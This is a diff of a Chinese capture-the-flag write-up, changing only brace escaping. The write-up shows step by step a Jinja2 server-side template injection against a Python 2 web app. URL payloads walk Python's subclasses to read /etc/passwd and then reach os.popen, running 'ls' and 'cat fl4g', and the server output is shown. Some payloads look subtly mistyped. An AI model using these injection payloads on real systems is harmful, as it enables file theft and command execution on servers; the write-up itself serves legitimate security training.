@@ -15,29 +15,29 @@ comments: true
 
 3. 使用Burp Suite发起POST请求，服务器返回405，所以是通过GET方法传的参数，但是参数名网站一点信息都没有
 
-4. 访问ip:port/{{"".\_\_class\_\_.\_\_bases\_\_}}，返回内容为/(\<type 'basestring'\>,)not found，并没有找到Object类
+4. 访问ip:port/\{\{"".\_\_class\_\_.\_\_bases\_\_\}\}，返回内容为/(\<type 'basestring'\>,)not found，并没有找到Object类
 
-5. 访问ip:port/{{"".\_\_class\_\_.\_\_mro\_\_}}，返回内容为/(\<type 'str'\>, \<type 'basestring'\>, \<type 'object'\>) not found，找到了Object类，立刻通过它查找可用类
+5. 访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_\}\}，返回内容为/(\<type 'str'\>, \<type 'basestring'\>, \<type 'object'\>) not found，找到了Object类，立刻通过它查找可用类
 
-6. 访问ip:port/{{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()}}，共299个子类，其中第40号type(第41个)指向file类
+6. 访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()\}\}，共299个子类，其中第40号type(第41个)指向file类
 
    ```text
    /[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>.....................] not found
    ```
 
-7. 访问ip:port/{{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[40].("/etc/passwd").read()}}，返回如下内容，可以看出目前可以正常读取文件，但是flag在什么位置仍未可知
+7. 访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[40].("/etc/passwd").read()\}\}，返回如下内容，可以看出目前可以正常读取文件，但是flag在什么位置仍未可知
 
    ```shell
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false 0:x:0:0:noone:/tmp:/sbin/nologin
    ```
 
-8. 发现能通过warnings.catch_warnings的linecache函数引用了os函数，可以访问os模块执行系统命令。访问ip:port/{{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_line\_\_.os.popen('ls').read()，返回内容为/fl4g index.py not found,找到flag文件
+8. 发现能通过warnings.catch_warnings的linecache函数引用了os函数，可以访问os模块执行系统命令。访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_line\_\_.os.popen('ls').read()\}\}，返回内容为/fl4g index.py not found,找到flag文件
 
 9. 直接通过网址访问ip:port/fl4g，访问失败
 
-10. 继续使用linecache函数进行调用系统函数，ip:port/{{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_line\_\_.os.popen('cat fl4g').read()，返回内容为/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found
+10. 继续使用linecache函数进行调用系统函数，ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_line\_\_.os.popen('cat fl4g').read()\}\}，返回内容为/ctf\{f22b6844-5169-4054-b2a0-d95b9361cb57\} not found
 
-11. 发现flag，ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}
+11. 发现flag，ctf\{f22b6844-5169-4054-b2a0-d95b9361cb57\}
 
 12. 提交，答案正确
 
